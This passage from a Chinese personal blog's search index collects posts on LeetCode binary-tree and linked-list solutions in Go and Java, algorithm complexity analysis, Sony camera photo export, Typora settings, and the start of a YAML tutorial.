通过子树的最大深度推导出原树的深度，所以当然要首先利用递归函数的定义算出左右子树的最大深度，然后推出原树的最大深度，主要逻辑自然放在后序位置。\n\nfunc Max(a, b int) int{\n    if a > b {\n        return a\n    }\n    return b\n}\n```\n\n\n\n### 1.2 判断平衡二叉树 🔥\n\n+ https://leetcode.cn/problems/balanced-binary-tree/\n\n```go\nfunc isBalanced(root *TreeNode) bool {\n    if root == nil{\n        return true\n    }\n    if !isBalanced(root.Left) || !isBalanced(root.Right){\n        return false\n    }\n    if abs(maxDepth(root.Left)-maxDepth(root.Right)) > 1 {\n        return false\n    }\n    return true\n}\n\nfunc maxDepth(root *TreeNode) int {\n    if root == nil {\n        return 0\n    }\n    return max(maxDepth(root.Left),maxDepth(root.Right)) + 1\n}\n\nfunc max(a,b int) int {\n    if a > b {\n        return a\n    }\n    return b\n}\n\nfunc abs(a int) int {\n    if a < 0 {\n        return -a\n    }\n    return a \n}\n```\n\n\n\n### 1.3 翻转二叉树🔥\n\n+ https://leetcode.cn/problems/invert-binary-tree/\n\n+ brew作者失败的题\n\n```go\nfunc mirrorTree(root *TreeNode) *TreeNode {\n    if root == nil{\n        return nil\n    }\n\n    left := mirrorTree(root.Left)\n    right := mirrorTree(root.Right)\n    root.Left = right\n    root.Right = left\n    return root\n}\n```\n\n\n\n\n\n# 2. 其他\n\n### 2.1 二叉树的直径\n\n+ https://leetcode.cn/problems/diameter-of-binary-tree/\n\n**每一条二叉树的「直径」长度，就是一个节点的左右子树的最大深度之和**。\n\n\n\n\n\n### + [重建二叉树](https://leetcode-cn.com/problems/zhong-jian-er-cha-shu-lcof/)(中等)\n\n+ 画图, len(preorder[:pos])  是左子树的长度\n\n```go\nfunc buildTree(preorder []int, inorder []int) *TreeNode {\n    if len(preorder) == 0{\n        return nil \n    }\n\n    root := &TreeNode{preorder[0],nil,nil}\n    pos := 0\n    for ; pos < len(inorder); pos++{\n        if inorder[pos] == preorder[0]{\n            break\n        }\n    }\n\n    root.Left = buildTree(preorder[1:len(preorder[:pos])+1],inorder[:pos]) \n    root.Right =  buildTree(preorder[len(preorder[:pos])+1:],inorder[pos+1:]) \n    return root\n}\n```\n\n### + [合并二叉树](https://leetcode-cn.com/problems/merge-two-binary-trees/)(简单)\n\n```go\nfunc mergeTrees(root1 *TreeNode, root2 *TreeNode) *TreeNode {\n    if root1 == nil{\n        return root2\n    }\n    if root2 == nil{\n        return root1\n    }\n\n    root1.Val = root1.Val + root2.Val\n    root1.Left = mergeTrees(root1.Left, root2.Left)\n    root1.Right = mergeTrees(root1.Right, root2.Right)\n    return root1  \n}\n```\n\n### + [相同的树](https://leetcode-cn.com/problems/same-tree/)(简单)\n\n```go\nfunc isSameTree(p *TreeNode, q *TreeNode) bool {\n    if p == nil && q == nil {\n        return true\n    }\n    if p == nil || q == nil {\n        return false\n    }\n\n    return p.Val == q.Val && isSameTree(p.Left, q.Left) && isSameTree(p.Right, q.Right)\n}\n```\n\n\n\n### + [另一个树的子树](https://leetcode-cn.com/problems/subtree-of-another-tree/)(简单)\n\n```go\nfunc isSubtree(root *TreeNode, subRoot *TreeNode) bool {\n    if root == nil || subRoot == nil {\n        return false\n    }\n\n    if isSameTree(root, subRoot) {\n        return true\n    }\n\n    return isSubtree(root.Left, subRoot) || isSubtree(root.Right, subRoot)\n}\n\n\nfunc isSameTree(p *TreeNode, q *TreeNode) bool {\n  if p == nil && q == nil {\n        return true\n    }\n    if p == nil || q == nil {\n        return false\n    }\n\n    return p.Val == q.Val && isSameTree(p.Left, q.Left) && isSameTree(p.Right, q.Right)\n}\n```\n\n\n\n### + [树的子结构](https://leetcode-cn.com/problems/shu-de-zi-jie-gou-lcof/)(中等)\n\n```go\nfunc isSubStructure(A *TreeNode, B *TreeNode) bool {\n    if A == nil || B == nil {\n        return false\n    }\n\n    return isContain(A, B) || isSubStructure(A.Left, B) || isSubStructure(A.Right, B)\n    \n}\n\n\n// A,B根节点相同，B是不是A的子结构\nfunc isContain(A *TreeNode, B *TreeNode) bool {\n    if B == nil {\n        return true\n    }\n    if A == nil {\n        return false\n    }\n    if A.Val != B.Val {\n        return false\n    }\n    return isContain(A.Left, B.Left) && isContain(A.Right, B.Right)\n}\n```\n\n\n\n### + [单值二叉树](https://leetcode-cn.com/problems/univalued-binary-tree/)(简单)\n\n```go\nfunc isUnivalTree(root *TreeNode) bool {\n    if root == nil {\n        return true\n    }\n    if root.Left != nil && root.Val != root.Left.Val {\n        return false\n    }\n    if root.Right != nil && root.Val != root.Right.Val {\n        return false\n    }\n    return isUnivalTree(root.Left) && isUnivalTree(root.Right)\n}\n```\n\n\n\n\n\n### + [对称的二叉树](https://leetcode-cn.com/problems/dui-cheng-de-er-cha-shu-lcof/)(简单)\n\n```go\nfunc isSymmetric(root *TreeNode) bool {\n    if root == nil {\n        return true\n    }\n    return isMirror(root.Left, root.Right)\n}\n\n\nfunc isMirror(l, r *TreeNode) bool {\n    if l == nil && r == nil {\n        return true\n    }\n    if l == nil || r == nil{\n        return false\n    }\n\n   return l.Val == r.Val && isMirror(l.Right, r.Left) && isMirror(l.Left,r.Right)\n}\n```\n\n\n\n### + [二叉搜索树的最近公共祖先](https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/)(简单) \n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n\tval := root.Val\n    pv := p.Val\n    qv := q.Val\n\n    if pv > val && qv > val {\n        return lowestCommonAncestor(root.Right, p, q)\n    }else if pv < val && qv < val {\n        return lowestCommonAncestor(root.Left, p, q)\n    }else{\n        return root\n    }\n}\n```\n\n\n\n### + [二叉树的最近公共祖先](https://leetcode-cn.com/problems/er-cha-shu-de-zui-jin-gong-gong-zu-xian-lcof/) (中等)\n\n```go\nfunc lowestCommonAncestor(root, p, q *TreeNode) *TreeNode {\n    if root == nil {\n        return nil\n    }\n    if p == root || q == root {\n        return root\n    }\n\n    l := lowestCommonAncestor(root.Left, p, q)\n    r := lowestCommonAncestor(root.Right,p, q)\n    if l != nil && r != nil {// 左右各一个\n        return root\n    }\n    if l != nil {// 两都在左边\n        return l\n    }\n    if r != nil{ // 两都在右边\n        return r\n    }\n\n    return nil\n}\n```\n\n\n\n### + [二叉搜索树的第k大节点](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-di-kda-jie-dian-lcof/)(简单)\n\n```go\nvar arr[]int\n\nfunc kthLargest(root *TreeNode, k int) int {\n    if root == nil {\n        return 0\n    }\n    arr = []int{}\n    dfs(root)\n    return arr[k-1]\n}\n\nfunc dfs(root *TreeNode) {\n    if root == nil  {\n        return \n    }\n    dfs(root.Right)\n    arr = append(arr, root.Val)\n    dfs(root.Left)\n}\n```\n\n### + [二叉树中和为某一值的路径](https://leetcode-cn.com/problems/er-cha-shu-zhong-he-wei-mou-yi-zhi-de-lu-jing-lcof/)(中等) TODO\n\n### + [二叉搜索树的后序遍历序列](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-de-hou-xu-bian-li-xu-lie-lcof/)(中等) TODO\n\n### + [二叉搜索树与双向链表](https://leetcode-cn.com/problems/er-cha-sou-suo-shu-yu-shuang-xiang-lian-biao-lcof/)(中等) TODO\n\n# 3. 算法理解\n\n### 3.1  两种思路解题\n\n二叉树的前序遍历结果怎么算？\n\n+ 回朔算法核心思路（递归遍历）\n\n```java\nList<Integer> res = new LinkedList<>();\nList<Integer> preorder(TreeNode root) {\n    traverse(root);\n\t\treturn res; \n}\n\nvoid traverse(TreeNode root) { // 没有返回值\n    if (root == null) {\n\t\t\treturn; \n    }\n    res.addLast(root.val);\n    traverse(root.left);\n    traverse(root.right);\n}\n```\n\n+ 动态规划核心思路 （分解）\n\n```java\nList<Integer> preorder(TreeNode root) {\n   List<Integer> res = new LinkedList<>();\n   if (root == null) {\n\t\t\treturn res; \n   }\n\n\tres.add(root.val);\n  res.addAll(preorder(root.left)); \n \tres.addAll(preorder(root.right));\n  return res\n}\n\n```\n\n### 3.2 深入理解前中后序\n\n**前中后序是遍历二叉树过程中处理每一个节点的三个特殊时间点**，绝不仅仅是三个顺序不同的List\n\n前序位置的代码在刚刚进入一个二叉树节点的时候执行；\n\n后序位置的代码在将要离开一个二叉树节点的时候执行；\n\n中序位置的代码在一个二叉树节点左子树都遍历完，即将开始遍历右子树的时候执行。\n\n### 3.3 后序加强\n\n**前序位置的代码只能从函数参数中获取父节点传递来的数据，而后序位置的代码不仅可以获取参数数据，还可以获取到子树通过函数返回值传递回来的数据**。\n\n```go\n// 定义：输入一棵二叉树，返回这棵二叉树的节点总数\nint count(TreeNode root) {\n    if (root == null) {\n        return 0;\n    }\n    int leftCount = count(root.left);\n    int rightCount = count(root.right);\n    // 后序位置\n    printf(\"节点 %s 的左子树有 %d 个节点，右子树有 %d 个节点\",\n            root, leftCount, rightCount);\n\n    return leftCount + rightCount + 1;\n}\n```\n\n只有后序位置才能通过返回值获取子树的信息。**换句话说，一旦你发现题目和子树有关，那大概率要给函数设置合理的定义和返回值，在后序位置写代码了**。\n\n遇到子树问题，首先想到的是给函数设置返回值，然后在后序位置做文章。\n\n### 3.4 DFS 又是什么\n\n动态规划/DFS/回溯算法 都可以看做二叉树问题的扩展，只是它们的关注点不同：\n\n+ 动态规划算法属于分解问题的思路，它的关注点在整棵「子树」。\n+ 回溯算法属于遍历的思路，它的关注点在节点间的「树枝」。\n+ DFS 算法属于遍历的思路，它的关注点在单个「节点」。\n\n##### 动态规划\n\n```go\n// 计算这棵二叉树共有多少个节点。\nint count(TreeNode root) {\n    if (root == null) {\n        return 0;\n    }\n    // 我这个节点关心的是我的两个子树的节点总数分别是多少\n    int leftCount = count(root.left);\n    int rightCount = count(root.right);\n    // 后序位置，左右子树节点数加上自己就是整棵树的节点数\n    return leftCount + rightCount + 1;\n}\n```\n\n动态规划分解问题的思路，它的着眼点永远是结构相同的整个子问题，类比到二叉树上就是「子树」。\n\n##### 回溯算法\n\n```go\n// 用遍历的思路写一个 traverse 函数，打印出遍历这棵二叉树的过程\nvoid traverse(TreeNode root) {\n    if (root == null) return;\n    printf(\"从节点 %s 进入节点 %s\", root, root.left);\n    traverse(root.left);\n    printf(\"从节点 %s 回到节点 %s\", root.left, root);\n\n    printf(\"从节点 %s 进入节点 %s\", root, root.right);\n    traverse(root.right);\n    printf(\"从节点 %s 回到节点 %s\", root.right, root);\n}\n\n\nvoid backtrack(...) {\n    for (int i = 0; i < ...; i++) {\n        // 做选择\n        ...\n\n        // 进入下一层决策树\n        backtrack(...);\n\n        // 撤销刚才做的选择\n        ...\n    }\n}\n```\n\n这就是回溯算法遍历的思路，它的着眼点永远是在节点之间移动的过程，类比到二叉树上就是「树枝」。\n\n##### DFS (深度优先搜索)\n\n```java\n// 写一个 traverse 函数，把这棵二叉树上的每个节点的值都加一。\n\nvoid traverse(TreeNode root) {\n    if (root == null) return;\n    // 遍历过的每个节点的值加一\n    root.val++;\n    traverse(root.left);\n    traverse(root.right);\n}\n```\n\n这就是 DFS 算法遍历的思路，它的着眼点永远是在单一的节点上，类比到二叉树上就是处理每个「节点」。\n\n### 3.5 DFS 和回朔区别\n\n```java\n// DFS 算法把「做选择」「撤销选择」的逻辑放在 for 循环外面\nvoid dfs(Node root) {\n    if (root == null) return;\n    // 做选择\n    print(\"我已经进入节点 %s 啦\", root)\n    for (Node child : root.children) {\n        dfs(child);\n    }\n    // 撤销选择\n    print(\"我将要离开节点 %s 啦\", root)\n}\n\n// 回溯算法把「做选择」「撤销选择」的逻辑放在 for 循环里面\nvoid backtrack(Node root) {\n    if (root == null) return;\n    for (Node child : root.children) {\n        // 做选择\n        print(\"我站在节点 %s 到节点 %s 的树枝上\", root, child)\n        backtrack(child);\n        // 撤销选择\n        print(\"我将要离开节点 %s 到节点 %s 的树枝上\", child, root)\n    }\n}\n```\n\n看到了吧，你回溯算法必须把「做选择」和「撤销选择」的逻辑放在 for 循环里面，否则怎么拿到「树枝」的两个端点？\n\n### 3.6 层序遍历 (BFS)\n\n```c++\nvoid levelTraverse(TreeNode* root) {\n    if (root == nullptr) return;\n    queue<TreeNode*> q;\n    q.push(root);\n\n    // 从上到下遍历二叉树的每一层\n    while (!q.empty()) {\n        int sz = q.size();\n        // 从左到右遍历每一层的每个节点\n        for (int i = 0; i < sz; i++) {\n            TreeNode* cur = q.front();\n            q.pop();\n            // 将下一层节点放入队列\n            if (cur->left != nullptr) {\n                q.push(cur->left);\n            }\n            if (cur->right != nullptr) {\n                q.push(cur->right);\n            }\n        }\n    }\n}\n```\n\n\n\n# 4. 参考资料\n\n+ https://labuladong.gitee.io/algo/tree-class/\n","tags":["算法"],"categories":["算法"]},{"title":"sony相机照片导出操作","url":"%2Fp%2Fe672b089.html","content":"\n\n\n### 1. 照片导出到手机上(方便快速使用和修改)\n\n1. sony 相机-> 第三项 -> 发送到智能手机 -> 在智能手机上选择 -> 出现了 wifi\n2. 手机连接sony 相机的 wifi\n3. 手机->Imaging Edge Mobile->连接装置->查看照片\n\n<!-- more -->\n\n### 2. 照片导出到 macbook\n\n硬盘太小放弃\n\n\n\n### 3. 照片导出到 windows\n\n1. 用数据线连接\n\n2. 出现U盘, DCIM文件夹内, 是照片, 直接剪切出来\n\n3. 视频是在PRIVATE文件夹内\n","tags":["摄影"],"categories":["摄影"]},{"title":"2算法-链表","url":"%2Fp%2F39bde9f0.html","content":"\n# 1. 双指针技巧\n\n### 1.1 [反转链表](https://leetcode-cn.com/problems/reverse-linked-list/)🔥\n\n+ 递归版本（返回最后的指针）（原地改两个指向）\n\n```go\n// 1->2->3->nil\n\n/// head=3\n// return\n\n/// head=2\n// 3->2\n// 2->nil\n\n/// head=1\n// 2->1\n// 1->nil\n\nfunc ReverseList(head *ListNode) *ListNode {\n\tif head == nil || head.Next == nil {\n\t\treturn head\n\t}\n\n\tlast := ReverseList(head.Next)\n\thead.Next.Next = head\n\thead.Next = nil\n\n\treturn last\n}\n```\n\n<!-- more -->\n\n+ 循环版本（搞三个临时指针，前，中，后）（四连咬）\n\n```c\n\t// 1->2->3->nil\n\n\t// 1->nil  \t\t\t | 2->3->nil\n\t// 2->1->nil\t\t | 3->nil\n\t// 3->2->1->nil  |  nil\n\n```\n\n代码如下：\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ListNode struct {\n\tVal  int\n\tNext *ListNode\n}\n\nfunc ReverseList(head *ListNode) *ListNode {\n\tvar prev, next *ListNode \n\tcurr := head\n\tfor curr != nil {\n\t\tnext = curr.Next\n\t\tcurr.Next = prev\n\t\tprev = curr\n\t\tcurr = next\n\t}\n\n\treturn prev\n}\n\nfunc main() {\n\tList1 := BuildList()\n\tfmt.Println(\"old\", GetList(List1))\n\tList2 := ReverseList(List1)\n\tfmt.Println(\"new\", GetList(List2))\n}\n\nfunc BuildList() *ListNode {\n\tL3 := &ListNode{Val: 3}\n\tL2 := &ListNode{Val: 2, Next: L3}\n\tL1 := &ListNode{Val: 1, Next: L2}\n\treturn L1\n}\n\nfunc GetList(head *ListNode) []int {\n\tvar arr []int\n\tfor head != nil {\n\t\tarr = append(arr, head.Val)\n\t\thead = head.Next\n\t}\n\treturn arr\n}\n\n```\n\n# \n\n### 1.2  合并链表🔥\n\n+ https://leetcode.cn/problems/merge-two-sorted-lists/\n\n+ `l1, l2` 类似于拉链两侧的锯齿，指针 `p` 就好像拉链的拉索，将两个有序链表合并\n\n```go\nfunc mergeTwoLists(list1 *ListNode, list2 *ListNode) *ListNode {\n    p1 := list1 \n    p2 := list2\n    p := &ListNode{}\n    dummy := p\n\n    for p1 !=nil && p2 !=nil{\n        if p1.Val > p2.Val{\n            p.Next = p2\n            p2 = p2.Next\n        }else{\n            p.Next = p1\n            p1 = p1.Next\n        }\n        p = p.Next\n    }\n\n    if p1 != nil {\n        p.Next = p1\n    }\n    if p2 != nil {\n        p.Next = p2\n    }\n    \n    return dummy.Next\n}\n```\n\n\n\n### 1.3 判断链表有环🔥\n\n+ https://leetcode.cn/problems/linked-list-cycle/\n+ 相交点不是有环的那个点\n\n```go\nfunc hasCycle(head *ListNode) bool {\n    slow := head\n    fast := head\n    for (fast != nil && fast.Next != nil){  // 一定要判断 fast\n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            return true\n        }\n    }\n    return false\n}\n```\n\n**如果有环，返回环的节点**\n\n+ https://leetcode.cn/problems/linked-list-cycle-ii/\n\n```go\nfunc detectCycle(head *ListNode) *ListNode {\n    slow := head\n    fast := head\n    cycle := false\n    for (fast != nil && fast.Next != nil){ \n        slow = slow.Next\n        fast = fast.Next.Next\n        if slow == fast{\n            cycle = true\n            break\n        }\n    }\n    if !cycle{\n        return nil\n    }\n\n    p1 := head\n    p2 := slow // 或者 fast\n    for p1 != p2 {\n        p1 = p1.Next\n        p2 = p2.Next\n    }\n    return p1\n}\n```\n\n### 1.4 分割链表 \n\n+ https://leetcode.cn/problems/partition-list/description/\n+ 多用临时指针，先放到两个链表上，最后再接上。\n\n```go\npackage main\n\nimport \"fmt\"\n\ntype ListNode struct {\n\tVal  int\n\tNext *ListNode\n}\n\nfunc BuildList() *ListNode {\n\tL1 := &ListNode{Val: 1}\n\tL2 := &ListNode{Val: 4}\n\tL3 := &ListNode{Val: 3}\n\tL4 := &ListNode{Val: 2}\n\tL5 := &ListNode{Val: 5}\n\tL6 := &ListNode{Val: 2}\n\tL1.Next = L2\n\tL2.Next = L3\n\tL3.Next = L4\n\tL4.Next = L5\n\tL5.Next = L6\n\treturn L1\n}\nfunc GetList(head *ListNode) []int {\n\tvar arr []int\n\tfor head != nil {\n\t\tarr = append(arr, head.Val)\n\t\thead = head.Next\n\t}\n\treturn arr\n}\n\nfunc partition(head *ListNode, x int) *ListNode {\n\tdummy1 := &ListNode{} // 小于x\n\tdummy2 := &ListNode{} // 大于x\n\tp1 := dummy1          // 小于x\n\tp2 := dummy2          // 大于x\n\n\tp := head\n\tfor p != nil {\n\t\tif p.Val < x {\n\t\t\tp1.Next = p\n\t\t\tp1 = p1.Next\n\t\t} else {\n\t\t\tp2.Next = p\n\t\t\tp2 = p2.Next\n\t\t}\n\n\t\t// 把原始链表整断\n\t\ttmp := p.Next\n\t\tp.Next = nil\n\t\tp = tmp\n\t}\n\t\n  // 接上链表\n\tp1.Next = dummy2.Next\n\treturn dummy1.Next\n}\n\nfunc main() {\n\thead := BuildList()\n\tfmt.Println(\"origin\", GetList(head))\n\tpartitionList := partition(head, 3)\n\tfmt.Println(\"partition\", GetList(partitionList))\n}\n\n```\n\n### 1.5 链表是否相交\n\n+ https://leetcode.cn/problems/intersection-of-two-linked-lists/\n\n```go\nfunc getIntersectionNode(headA, headB *ListNode) *ListNode {\n    pos1 := headA\n    pos2 := headB\n    for pos1 != pos2 {\n        if pos1 != nil{\n            pos1 = pos1.Next\n        }else{\n            pos1 = headB\n        }\n\n        if pos2 != nil {\n            pos2 = pos2.Next\n        }else{\n            pos2 = headA\n        }\n    }\n    return pos2\n}   \n```\n\n### 1.6 倒数第K个节点\n\n+ https://leetcode.cn/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/\n\n+ 先让快指针走k步，然后两个指针同步走，当快指针走到头时，慢指针就是链表倒数第k个节点。\n\n```go\nfunc getKthFromEnd(head *ListNode, k int) *ListNode {\n    fast := head\n    slow := head\n    for k >0 && fast != nil {\n        fast = fast.Next\n        k--\n    }\n    for fast != nil {\n        fast = fast.Next\n        slow = slow.Next\n    }\n    return slow\n}\n```\n\n\n\n# \n\n# 2. 其他\n\n### + [两两交换链表中的节点](https://leetcode-cn.com/problems/swap-nodes-in-pairs/)(中等)\n\n```go\nfunc swapPairs(head *ListNode) *ListNode {\n    if head == nil || head.Next == nil{\n        return head\n    }\n\n    next := head.Next  \n    ok := swapPairs(head.Next.Next)\n    head.Next.Next = head\n    head.Next = ok\n\n    return next\n}\n```\n\n\n\n\n\n\n\n### + [删除链表的节点](https://leetcode-cn.com/problems/shan-chu-lian-biao-de-jie-dian-lcof/)(简单)\n\n```go\nfunc deleteNode(head *ListNode, val int) *ListNode {\n    if head == nil {\n        return nil\n    }\n    head.Next = deleteNode(head.Next, val)\n    if head.Val == val {\n        return head.Next\n    }else{\n        return head\n    }\n}\n```\n\n\n\n### + [从尾到头打印链表](https://leetcode-cn.com/problems/cong-wei-dao-tou-da-yin-lian-biao-lcof/)(简单)\n\n```go\nfunc reversePrint(head *ListNode) []int {\n    if head == nil {\n        return nil\n    }\n\n    res := append(reversePrint(head.Next), head.Val) \n    return res\n}\n```\n\n\n\n","tags":["算法"],"categories":["算法"]},{"title":"1算法-数组","url":"%2Fp%2F52bc2d68.html","content":"\n### 1. [数组中重复的数字](https://leetcode-cn.com/problems/shu-zu-zhong-zhong-fu-de-shu-zi-lcof/)(简单)\n\n+ 头脑风暴: 临时数组++\n\n  ```go\n  func findRepeatNumber(nums []int) int {\n  \n      arr := make([]int, len(nums), len(nums))\n      for i := 0; i < len(nums); i++{\n          arr[nums[i]]++   \t\t\t\t\t\t// 题目说明, <n, 不会越界\n          if arr[nums[i]] > 1{\n              return nums[i]\n          }\n      }\n  \n      return 0\n  }\n  ```\n\n\n\n### 2. [合并两个有序数组](https://leetcode-cn.com/problems/merge-sorted-array/)\n\n  ```bash\n  func merge(nums1 []int, m int, nums2 []int, n int)  {\n\n      res := make([]int, 0, m+n)\n      p1 := 0\n      p2 := 0\n      for {\n          if p1 == m {\n              res = append(res, nums2[p2:]...)\n              break\n          }\n          if p2 == n {\n              res = append(res, nums1[p1:]...)\n              break\n          }\n          if nums1[p1] < nums2[p2] {\n              res = append(res, nums1[p1])\n              p1++\n          }else{\n              res = append(res, nums2[p2])\n              p2++\n          }\n      }\n\n      copy(nums1, res)\n  }\n  ```\n\n","tags":["算法"],"categories":["算法"]},{"title":"算法复杂度的理解","url":"%2Fp%2F7db09267.html","content":"\n# 1.复杂度分析\n\n算法本质上是一连串的计算步骤。对于同一个问题，我们可以使用不同的算法来获得相同的结果，可是在计算过程中电脑消耗的时间和资源却有很大的区别。那我们如何来比较不同算法之间的优劣性呢？目前分析算法主要从「时间」和「空间」两个维度来进行分析。\n\n+ 时间维度顾名思义就是算法需要消耗的时间，「时间复杂度」是常用的分析单位。\n\n+ 空间维度代表算法需要占用的内存空间，我们通常用「空间复杂度」来分析。\n\n<!-- more -->\n\n### 1.1 时间复杂度\n\n大O符号表示法，既 T(n) = O(f(n))，它表示一个算法的**渐进时间复杂度**。其中 f(n) 表示代码执行次数之和，O表示正比例关系。我们来看一个例子：\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\n```\n\n每个算法需要多少的运行时间呢？我们知道这个for loop有n个循环，假设其中 x++ 计算的消耗是一个单位，那么第一次循环是1单位，第二次循环是2单位，所以整个循环语句就要消耗n个单位。可以发现，消耗的单位时间随着循环的次数而变化，循环次数为1，时间为1单位；循环次数为10，时间为10单位；循环次数为n，时间为n单位。所以这个算法的「时间复杂度」可以表示为：T (n) = O(n)。\n\n\n\n有人可能不同意了，因为严格计算下，int i = 1也要消耗1单位时间，i <= n和i++也都需要1单位时间，所以严格来说总时间是 T(n) = 1 + 3n。但是我们依然会简化为n，因为「大O表示法」用与表示计算的增长变化趋势。\n\n\n在这个例子中，如果n无限大的时候，T(n) = 1 + 3n 中的常数1就没有意义了，倍数3也影响不大。所以简化为 T(n) = O(n) 就可以 了。\n\n\n\n我们再来看一个例子：\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\n在外层循环中，i 总共需要n层循环，在每一次内层循环中，j 也会循环n次。如果用「大O表示法」来计算，那么两个循环语句的复杂度就是 O(n²)，如果我们将这两个算法合并到一起：\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\n整个算法复杂度就变为 O(n + n²)，在n无限大的情况下，可以简化为 O(n²)。\n\n### 1.2 常用的时间复杂度量级\n\n![1](算法复杂度的理解/0.png)\n\n- 常数阶O(1)\n- 对数阶O(logN)\n- 线性阶O(n)\n- 线性对数阶O(nlogN)\n- 平方阶O(n²)\n- 立方阶O(n³)\n- K次方阶O(n^k)\n- 指数阶(2^n)\n- 阶乘O(n!)\n\n上面的时间复杂从上到下复杂度越来越大，也意味着执行效率越来越低。\n\n\n\n1. 常数阶O(1)\n\n只要没有循环或递归等复杂逻辑，无论代码执行多少行，代码复杂度都为O(1)，如下：\n\n```\nint x = 0;\nint y = 1;\nint temp = x;\nx = y;\ny = temp;\n```\n\n上述代码在执行的时候，所消耗的时间不会随着特定变量的增长而增长，即使有几万行这样的代码，我们都可以用O(1)来表示它的时间复杂度。\n\n2.线性阶O(n)\n\n我们在上述的例子中讲解过O(n)的算法：\n\n```\nfor (int i = 1; i <= n; i++) {\n    x++;\n}\n```\n\n在这段代码中，for循环会执行n遍，因此计算消耗的时间是随着n的变化而变化，因此这类代码都可以用O(n)来表示其时间复杂度。\n\n3.对数阶O(logN)\n\n来看以下的例子：\n\n```\nint i = 1;\nwhile(i < n) {\n    i = i * 2;\n}\n```\n\n在上面的循环中，每次i都会被乘以2，也意味着每次 i 都离 n 更进一步。那需要多少次循环 i 才能等于或大于 n 呢，也就是求解2的x次方等于n，答案x=log2^n。也就是说循环 log2^n次之后，i会大于等于n，这段代码就结束了。所以此代码的复杂度为：O(logN)。\n\n4.线性对数阶O(nlogN)\n\n线性对数阶O(nlogN)很好理解，也就是将复杂度为O(logN)的代码循环n遍：\n\n```\nfor(int i = 0; i <= n: i++) {\n    int x = 1;\n    while(x < n) {\n        x = x * 2;\n    }\n}\n```\n\n因为每次循环的复杂度为O(logN)，所以n * logN = O(nlogN)\n\n5.平方阶O(n²)\n\n在之前的例子我们也讲过，O(n²)就是将循环次数为n的代码再循环n遍：\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= n; j++) {\n        x++;\n    }\n}\n```\n\nO(n²)的本质就是n * n，如果我们将内层的循环次数改为m：\n\n```\nfor (int i = 1; i <= n; i++) {\n    for (int j = 1; j <= m; j++) {\n        x++;\n    }\n}\n```\n\n复杂度就变为 n * m = O(n * m)。\n\n关于一些更高的阶级比如O(n³)或者O(n^k)，我们可以参考O(n²)来理解即可，O(n³)相当于三层循环，以此类推。\n\n除了「大O表示法」还有其他「平均时间复杂度」、「均摊时间复杂度」、「最坏时间复杂度」、「最好时间复杂度」等等分析指数，但是最常用的依然是「大O表示法」。\n\n\n\n### 1.3 空间复杂度\n\n既然「时间复杂度」不是计算程序具体消耗的时间，「空间复杂度」也不是用来计算程序具体占用的空间。随着问题量级的变大，程序需要分配的内存空间也可能会变得更多，而「空间复杂度」反映的则是内存空间增长的趋势。\n\n\n\n### 1.4 常用的空间复杂度\n\n比较常用的空间复杂度有：O(1)、O(n)、O(n²)。在下面的例子中，我们用 S(n) 来定义「空间复杂度」。\n\n1. O(1)空间复杂度\n\n如果算法执行所需要的临时空间不随着某个变量n的大小而变化，此算法空间复杂度为一个常量，可表示为 O(1)：\n\n```\nint x = 0;\nint y = 0;\nx++;\ny++;\n```\n\n其中x, y所分配的空间不随着处理数据量变化，因此「空间复杂度」为 O(1)\n\n2. O(n)空间复杂度\n\n以下的代码给长度为n的数组赋值：\n\n```\nint[] newArray = new int[n];\nfor (int i = 0; i < n; i++) {\n    newArray[i] = i;\n}\n```\n\n在这段代码中，我们创建了一个长度为 n 的数组，然后在循环中为其中的元素赋值。因此，这段代码的「空间复杂度」取决于 newArray 的长度，也就是 n，所以 S(n) = O(n)。\n\n\n\n# 2. 算法复杂度速查表\n\n### 2.1 抽象数据结构的操作复杂度\n\n![1](算法复杂度的理解/1.png)\n\n\n\n### 2.2 数组排序\n\n![1](算法复杂度的理解/2.png)\n\n冒泡、选择、插入 排序需要两个for循环，每次只关注一个元素，平均时间复杂度为O(n²)）（一遍找元素O(n)，一遍找位置O(n)）\n\n快速、归并、希尔、堆基于二分思想，log以2为底，平均时间复杂度为O(nlogn)（一遍找元素O(n)，一遍找位置O(logn)）\n\n\n\n### 2.3 堆\n\n+ 建堆的时间复杂度是O(n)；\n+ 堆的插入、删除元素的时间复杂度都是O(log n)；\n+ 堆排序的时间复杂度是O(nlog n)；\n+ 堆排序的空间复杂度是O(1)；\n\n# 3. 参考资料\n\n+ https://turingplanet.org/2020/02/03/%E3%80%90%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%953%E3%80%91/\n+ https://blog.csdn.net/Jmayday/article/details/104529770","tags":["算法"],"categories":["算法"]},{"title":"markdown写作typora的配置","url":"%2Fp%2F3527bba1.html","content":"\nmac上写作markdown，个人感觉目前还没有比typora更优秀的工具（obsidian不服）。\n\n<!-- more -->\n\n# 1. 常用配置\n\n### 1.1 显示大纲\n\nView->Outline\n\n### 1.2 插入大纲\n\n在markdown 插入 `[TOC]` 即可。\n\n\n### 1.3 图片拷贝到指定目录\n\n图片直接 `Ctrl + v` 即可粘贴拷贝到指定目录并实时预览。\n\n<img src=\"markdown写作typora的配置/image-20220108155908753.png\" alt=\"image-20220108155908753\" style=\"zoom:50%;\" />\n\n# 2. 主题设置\n\n### 2.1 黑色主题\n\n+ Dracula\n\n### 2.2 白色主题\n\n+ Ladder （素描的感觉）\n\n+ Lapis （商务的感觉）\n\n+ Next-helvetica （自己博客，适合代码）\n\n+ Notion Light Enhanced （github的感觉，适合代码）\n\n  \n\n  \n","tags":["typora"],"categories":["软件"]},{"title":"YAML语言教程","url":"%2Fp%2Ff2ad59fc.html","content":"\n## YAML介绍\n\nYAML 语言（发音 /ˈjæməl/ 